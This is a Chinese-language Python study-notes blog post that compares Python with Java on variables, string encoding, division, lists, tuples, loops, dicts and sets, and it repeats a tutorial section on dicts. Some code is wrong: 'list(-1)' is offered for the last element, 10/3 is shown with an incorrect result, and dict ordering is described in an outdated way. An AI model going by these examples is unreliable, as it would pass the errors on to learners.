<p>而Python的定义方式则是<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">123</span></span><br></pre></td></tr></table></figure></p>
<p>Python可以将这里的a变量修改为字符串而Java不行.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">"String"</span></span><br></pre></td></tr></table></figure></p>
<p>因为Python是动态语言，Java是静态语言，静态语言在定义变量时必须指定变量类型，如果赋值的时候如果类型不匹配，就会报错。而动态语言就不会。</p>
<h3 id="字符串："><a href="#字符串：" class="headerlink" title="字符串："></a>字符串：</h3><p>Python的字符串：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">"ABC"</span></span><br><span class="line">b = a</span><br><span class="line">a = <span class="string">"EFG"</span></span><br><span class="line">&gt;&gt;&gt;b</span><br><span class="line"><span class="string">"ABC"</span></span><br></pre></td></tr></table></figure></p>
<p>可以看到b是指向a指向的内存空间而不是指向a</p>
<h3 id="常量："><a href="#常量：" class="headerlink" title="常量："></a>常量：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PI = <span class="number">3.14159265359</span></span><br></pre></td></tr></table></figure>
<p>但是其实，python是没有常量的存在的，只是习惯用大写的常量名来表示这是一个常量，事实上在这里的PI值仍然可以改变。Python是没有机制能保护PI不被改变</p>
<h3 id="除法："><a href="#除法：" class="headerlink" title="除法："></a>除法：</h3><p>Python中的除法很特殊，整数除以整数结果不一定是整数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="number">10</span> / <span class="number">3</span></span><br><span class="line"><span class="number">3.33333333333333335</span></span><br></pre></td></tr></table></figure></p>
<p>这里出现5是计算机数据都是用二进制存储的原因。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="number">9</span> / <span class="number">3</span></span><br><span class="line"><span class="number">3.0</span></span><br></pre></td></tr></table></figure></p>
<p>python的除法都是有精确值的，如果不想要精确值的话可以用floor除，语法如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="number">10</span> // <span class="number">3</span></span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure></p>
<p>同样Python也有模运算<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="number">10</span> % <span class="number">3</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<h3 id="字符串和编码"><a href="#字符串和编码" class="headerlink" title="字符串和编码"></a>字符串和编码</h3><p>在最新的Python 3版本中，字符串是以Unicode编码的，也就是说，Python的字符串支持多语言，例如：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(<span class="string">'包含中文的str'</span>)</span><br><span class="line">包含中文的str</span><br></pre></td></tr></table></figure></p>
<p>对于单个字符的编码，Python提供了ord()函数获取字符的整数表示，chr()函数把编码转换为对应的字符：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ord(<span class="string">'A'</span>)</span><br><span class="line"><span class="number">65</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ord(<span class="string">'中'</span>)</span><br><span class="line"><span class="number">20013</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(<span class="number">66</span>)</span><br><span class="line"><span class="string">'B'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(<span class="number">25991</span>)</span><br><span class="line"><span class="string">'文'</span></span><br></pre></td></tr></table></figure></p>
<p>如果知道字符的整数编码，还可以用十六进制这么写str：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'\u4e2d\u6587'</span></span><br><span class="line"><span class="string">'中文'</span></span><br></pre></td></tr></table></figure></p>
<p>Python对bytes类型的数据用带b前缀的单引号或双引号表示：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="string">b'ABC'</span></span><br></pre></td></tr></table></figure></p>
<p>以Unicode表示的str通过encode()方法可以编码为指定的bytes，例如：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'ABC'</span>.encode(<span class="string">'ascii'</span>)</span><br><span class="line"><span class="string">b'ABC'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'中文'</span>.encode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="string">b'\xe4\xb8\xad\xe6\x96\x87'</span></span><br></pre></td></tr></table></figure></p>
<p>如果我们从网络或磁盘上读取了字节流，那么读到的数据就是bytes。要把bytes变为str，就需要用decode()方法：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">b'ABC'</span>.decode(<span class="string">'ascii'</span>)</span><br><span class="line"><span class="string">'ABC'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">b'\xe4\xb8\xad\xe6\x96\x87'</span>.decode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="string">'中文'</span></span><br></pre></td></tr></table></figure></p>
<p>如果bytes中包含无法解码的字节，decode()方法会报错.<br>如果bytes中只有一小部分无效的字节，可以传入errors=’ignore’忽略错误的字节：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">b'\xe4\xb8\xad\xff'</span>.decode(<span class="string">'utf-8'</span>, errors=<span class="string">'ignore'</span>)</span><br><span class="line"><span class="string">'中'</span></span><br></pre></td></tr></table></figure></p>
<p>要计算str包含多少个字符，可以用len()函数：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>len(<span class="string">'ABC'</span>)</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>len(<span class="string">'中文'</span>)</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure></p>
<p>len()函数计算的是str的字符数，如果换成bytes，len()函数就计算字节数：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>len(<span class="string">b'ABC'</span>)</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>len(<span class="string">b'\xe4\xb8\xad\xe6\x96\x87'</span>)</span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>len(<span class="string">'中文'</span>.encode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="number">6</span></span><br></pre></td></tr></table></figure></p>
<p>由于Python源代码也是一个文本文件，所以，当你的源代码中包含中文的时候，在保存源代码时，就需要务必指定保存为UTF-8编码。当Python解释器读取源代码时，为了让它按UTF-8编码读取，我们通常在文件开头写上这两行：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br></pre></td></tr></table></figure></p>
<p>在Python中，采用的格式化方式和C语言是一致的，用%实现，举例如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'Hello, %s'</span> % <span class="string">'world'</span></span><br><span class="line"><span class="string">'Hello, world'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'Hi, %s, you have $%d.'</span> % (<span class="string">'Michael'</span>, <span class="number">1000000</span>)</span><br><span class="line"><span class="string">'Hi, Michael, you have $1000000.'</span></span><br></pre></td></tr></table></figure></p>
<p>%运算符就是用来格式化字符串的。在字符串内部，%s表示用字符串替换，%d表示用整数替换，有几个%?占位符，后面就跟几个变量或者值，顺序要对应好。如果只有一个%?，括号可以省略。</p>
<h6 id="常见的占位符有："><a href="#常见的占位符有：" class="headerlink" title="常见的占位符有："></a>常见的占位符有：</h6><p>占位符    替换内容<br>%d    整数<br>%f    浮点数<br>%s    字符串<br>%x    十六进制整数</p>
<h3 id="list和tuple"><a href="#list和tuple" class="headerlink" title="list和tuple:"></a>list和tuple:</h3><h6 id="list用-括起来，而tuple用-。"><a href="#list用-括起来，而tuple用-。" class="headerlink" title="list用[]括起来，而tuple用()。"></a>list用[]括起来，而tuple用()。</h6><h6 id="list的内容是可以更改的可变有序表，而tuple是不可更改的。"><a href="#list的内容是可以更改的可变有序表，而tuple是不可更改的。" class="headerlink" title="list的内容是可以更改的可变有序表，而tuple是不可更改的。"></a>list的内容是可以更改的可变有序表，而tuple是不可更改的。</h6><h6 id="用len方法依然可以计算list的长度"><a href="#用len方法依然可以计算list的长度" class="headerlink" title="用len方法依然可以计算list的长度"></a>用len方法依然可以计算list的长度</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;list = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">&gt;&gt;&gt;len(list)</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>
<h6 id="可以用list-1-来获取list最后一个元素"><a href="#可以用list-1-来获取list最后一个元素" class="headerlink" title="可以用list(-1)来获取list最后一个元素"></a>可以用list(-1)来获取list最后一个元素</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;list(<span class="number">-1</span>)</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>
<h6 id="list中可以用append方法向list"><a href="#list中可以用append方法向list" class="headerlink" title="list中可以用append方法向list"></a>list中可以用append方法向list</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;list = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">&gt;&gt;&gt;list.append(<span class="number">1</span>)</span><br><span class="line">&gt;&gt;&gt;list</span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>]</span><br></pre></td></tr></table></figure>
<h6 id="list中可以用pop方法来删除指定元素，不传入就删除最后一个"><a href="#list中可以用pop方法来删除指定元素，不传入就删除最后一个" class="headerlink" title="list中可以用pop方法来删除指定元素，不传入就删除最后一个"></a>list中可以用pop方法来删除指定元素，不传入就删除最后一个</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;list.pop()</span><br><span class="line"><span class="number">1</span></span><br><span class="line">&gt;&gt;&gt;list.pop(<span class="number">2</span>)</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>
<h6 id="可以用list来存list："><a href="#可以用list来存list：" class="headerlink" title="可以用list来存list："></a>可以用list来存list：</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;p = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">&gt;&gt;&gt;s = [<span class="number">1</span>,<span class="number">2</span>,p] <span class="comment">#这里我们要得到3，可以用以下两种方法</span></span><br><span class="line">&gt;&gt;&gt;p[<span class="number">2</span>]<span class="comment">#或者</span></span><br><span class="line">&gt;&gt;&gt;s[<span class="number">2</span>][<span class="number">2</span>]</span><br></pre></td></tr></table></figure>
<h6 id="当然，list里的数据类型是可以不同的，"><a href="#当然，list里的数据类型是可以不同的，" class="headerlink" title="当然，list里的数据类型是可以不同的，"></a>当然，list里的数据类型是可以不同的，</h6><h6 id="tuple中可以存list，list中也可以存tuple-并且tuple里的list是可以修改的。"><a href="#tuple中可以存list，list中也可以存tuple-并且tuple里的list是可以修改的。" class="headerlink" title="tuple中可以存list，list中也可以存tuple,并且tuple里的list是可以修改的。"></a>tuple中可以存list，list中也可以存tuple,并且tuple里的list是可以修改的。</h6><h6 id="为了区分tuple："><a href="#为了区分tuple：" class="headerlink" title="为了区分tuple："></a>为了区分tuple：</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;t = (<span class="number">1</span>)</span><br><span class="line">&gt;&gt;&gt;t</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<h6 id="上面的是数字1，而下面是tuple"><a href="#上面的是数字1，而下面是tuple" class="headerlink" title="上面的是数字1，而下面是tuple"></a>上面的是数字1，而下面是tuple</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;t = (<span class="number">1</span>,)</span><br><span class="line">&gt;&gt;&gt;t</span><br><span class="line">(<span class="number">1</span>,)</span><br></pre></td></tr></table></figure>
<p>这里，即使t中只有一个元素1，也要加,与数字1区分。</p>
<p>###条件判断：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> age &gt;=<span class="number">18</span>:</span><br><span class="line">    print(age)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'kid'</span>)</span><br></pre></td></tr></table></figure></p>
<p>else if在这里则改为 elif</p>
<p>Python有一个input()：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s = input(<span class="string">'birth: '</span>)</span><br><span class="line">birth = int(s)</span><br><span class="line"><span class="keyword">if</span> birth &lt; <span class="number">2000</span>:</span><br><span class="line">    print(<span class="string">'00前'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'00后'</span>)</span><br></pre></td></tr></table></figure></p>
<h3 id="循环："><a href="#循环：" class="headerlink" title="循环："></a>循环：</h3><p>这里的循环与java不同在于<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]:</span><br><span class="line">或者</span><br><span class="line">names = [ana,con,da]</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">或者</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">101</span>)</span><br><span class="line">都是可行的，前两个遍历数组，第三个则是一个运行条件</span><br><span class="line">range(start, stop[, step])：start为开始，stop为结束，step为步长（默认为<span class="number">1</span>）</span><br><span class="line">如range(<span class="number">0</span>,<span class="number">5</span>)等价于range(<span class="number">0</span>,<span class="number">5</span>,<span class="number">1</span>)，结果是[<span class="number">0</span>，<span class="number">1</span>，<span class="number">2</span>，<span class="number">3</span>，<span class="number">4</span>]</span><br><span class="line">range(<span class="number">101</span>)则是<span class="number">0</span><span class="number">-100</span>且以<span class="number">1</span>为步长</span><br></pre></td></tr></table></figure></p>
<h3 id="break和continue"><a href="#break和continue" class="headerlink" title="break和continue"></a>break和continue</h3><p>这里break和continue与java中相同，不赘述</p>
<h3 id="dict和set"><a href="#dict和set" class="headerlink" title="dict和set"></a>dict和set</h3><p>Python内置了字典：dict的支持，dict全称dictionary，在其他语言中也称为map，使用键-值（key-value）存储，具有极快的查找速度。<br>这里的dict和json相似。key：value<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = &#123;<span class="string">'Michael'</span>: <span class="number">95</span>, <span class="string">'Bob'</span>: <span class="number">75</span>, <span class="string">'Tracy'</span>: <span class="number">85</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d[<span class="string">'Michael'</span>]</span><br><span class="line"><span class="number">95</span></span><br></pre></td></tr></table></figure></p>
<p>可以用in来判断指定的key是否在字典中。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'Thomas'</span> <span class="keyword">in</span> d</span><br><span class="line"><span class="keyword">False</span></span><br></pre></td></tr></table></figure></p>
<p>dict提供的get()方法，如果key不存在，可以返回None，或者自己指定的value：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.get(<span class="string">'Thomas'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.get(<span class="string">'Thomas'</span>, <span class="number">-1</span>)</span><br><span class="line"><span class="number">-1</span></span><br></pre></td></tr></table></figure></p>
<p>要删除一个key，用pop(key)方法，对应的value也会从dict中删除：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.pop(<span class="string">'Bob'</span>)</span><br><span class="line"><span class="number">75</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d</span><br><span class="line">&#123;<span class="string">'Michael'</span>: <span class="number">95</span>, <span class="string">'Tracy'</span>: <span class="number">85</span>&#125;</span><br></pre></td></tr></table></figure></p>
<h6 id="dict内部存放的顺序和key放入的顺序是没有关系的。"><a href="#dict内部存放的顺序和key放入的顺序是没有关系的。" class="headerlink" title="dict内部存放的顺序和key放入的顺序是没有关系的。"></a>dict内部存放的顺序和key放入的顺序是没有关系的。</h6><h6 id="和list比较，dict有以下几个特点："><a href="#和list比较，dict有以下几个特点：" class="headerlink" title="和list比较，dict有以下几个特点："></a>和list比较，dict有以下几个特点：</h6><p>查找和插入的速度极快，不会随着key的增加而变慢；<br>需要占用大量的内存，内存浪费多。</p>
<h6 id="而list相反："><a href="#而list相反：" class="headerlink" title="而list相反："></a>而list相反：</h6><p>查找和插入的时间随着元素的增加而增加；<br>占用空间小，浪费内存很少。<br>所以，dict是用空间来换取时间的一种方法。</p>
<h4 id="set和dict类似，也是一组key的集合，但不存储value。由于key不能重复，所以，在set中，没有重复的key。"><a href="#set和dict类似，也是一组key的集合，但不存储value。由于key不能重复，所以，在set中，没有重复的key。" class="headerlink" title="set和dict类似，也是一组key的集合，但不存储value。由于key不能重复，所以，在set中，没有重复的key。"></a>set和dict类似，也是一组key的集合，但不存储value。由于key不能重复，所以，在set中，没有重复的key。</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = set([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = set([<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure>
<p>通过add(key)方法可以添加元素到set中，可以重复添加，但不会有效果：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.add(<span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.add(<span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br></pre></td></tr></table></figure></p>
<p>通过remove(key)方法可以删除元素：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.remove(<span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure></p>
<p>使用dict和set</p>
<p>阅读: 709949<br>dict</p>
<p>Python内置了字典：dict的支持，dict全称dictionary，在其他语言中也称为map，使用键-值（key-value）存储，具有极快的查找速度。</p>
<p>举个例子，假设要根据同学的名字查找对应的成绩，如果用list实现，需要两个list：</p>
<p>names = [‘Michael’, ‘Bob’, ‘Tracy’]<br>scores = [95, 75, 85]<br>给定一个名字，要查找对应的成绩，就先要在names中找到对应的位置，再从scores取出对应的成绩，list越长，耗时越长。</p>
<p>如果用dict实现，只需要一个“名字”-“成绩”的对照表，直接根据名字查找成绩，无论这个表有多大，查找速度都不会变慢。用Python写一个dict如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = &#123;<span class="string">'Michael'</span>: <span class="number">95</span>, <span class="string">'Bob'</span>: <span class="number">75</span>, <span class="string">'Tracy'</span>: <span class="number">85</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d[<span class="string">'Michael'</span>]</span><br><span class="line"><span class="number">95</span></span><br></pre></td></tr></table></figure></p>
<p>为什么dict查找速度这么快？因为dict的实现原理和查字典是一样的。假设字典包含了1万个汉字，我们要查某一个字，一个办法是把字典从第一页往后翻，直到找到我们想要的字为止，这种方法就是在list中查找元素的方法，list越大，查找越慢。</p>
<p>第二种方法是先在字典的索引表里（比如部首表）查这个字对应的页码，然后直接翻到该页，找到这个字。无论找哪个字，这种查找速度都非常快，不会随着字典大小的增加而变慢。</p>
<p>dict就是第二种实现方式，给定一个名字，比如’Michael’，dict在内部就可以直接计算出Michael对应的存放成绩的“页码”，也就是95这个数字存放的内存地址，直接取出来，所以速度非常快。</p>
<p>你可以猜到，这种key-value存储方式，在放进去的时候，必须根据key算出value的存放位置，这样，取的时候才能根据key直接拿到value。</p>
<p>把数据放入dict的方法，除了初始化时指定外，还可以通过key放入：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d[<span class="string">'Adam'</span>] = <span class="number">67</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d[<span class="string">'Adam'</span>]</span><br><span class="line"><span class="number">67</span></span><br></pre></td></tr></table></figure></p>
<p>由于一个key只能对应一个value，所以，多次对一个key放入value，后面的值会把前面的值冲掉：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d[<span class="string">'Jack'</span>] = <span class="number">90</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d[<span class="string">'Jack'</span>]</span><br><span class="line"><span class="number">90</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d[<span class="string">'Jack'</span>] = <span class="number">88</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d[<span class="string">'Jack'</span>]</span><br><span class="line"><span class="number">88</span></span><br></pre></td></tr></table></figure></p>
<p>如果key不存在，dict就会报错：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d[<span class="string">'Thomas'</span>]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">KeyError: <span class="string">'Thomas'</span></span><br></pre></td></tr></table></figure></p>
<p>要避免key不存在的错误，有两种办法，一是通过in判断key是否存在：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'Thomas'</span> <span class="keyword">in</span> d</span><br><span class="line"><span class="keyword">False</span></span><br></pre></td></tr></table></figure></p>
<p>二是通过dict提供的get()方法，如果key不存在，可以返回None，或者自己指定的value：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.get(<span class="string">'Thomas'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.get(<span class="string">'Thomas'</span>, <span class="number">-1</span>)</span><br><span class="line"><span class="number">-1</span></span><br></pre></td></tr></table></figure></p>
<p>注意：返回None的时候Python的交互环境不显示结果。</p>
<p>要删除一个key，用pop(key)方法，对应的value也会从dict中删除：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.pop(<span class="string">'Bob'</span>)</span><br><span class="line"><span class="number">75</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d</span><br><span class="line">&#123;<span class="string">'Michael'</span>: <span class="number">95</span>, <span class="string">'Tracy'</span>: <span class="number">85</span>&#125;</span><br></pre></td></tr></table></figure></p>
<p>请务必注意，dict内部存放的顺序和key放入的顺序是没有关系的。</p>
<p>和list比较，dict有以下几个特点：</p>
<p>查找和插入的速度极快，不会随着key的增加而变慢；<br>需要占用大量的内存，内存浪费多。<br>而list相反：</p>
<p>查找和插入的时间随着元素的增加而增加；<br>占用空间小，浪费内存很少。<br>所以，dict是用空间来换取时间的一种方法。</p>
<p>dict可以用在需要高速查找的很多地方，在Python代码中几乎无处不在，正确使用dict非常重要，需要牢记的第一条就是dict的key必须是不可变对象。</p>
<p>这是因为dict根据key来计算value的存储位置，如果每次计算相同的key得出的结果不同，那dict内部就完全混乱了。这个通过key计算位置的算法称为哈希算法（Hash）。</p>
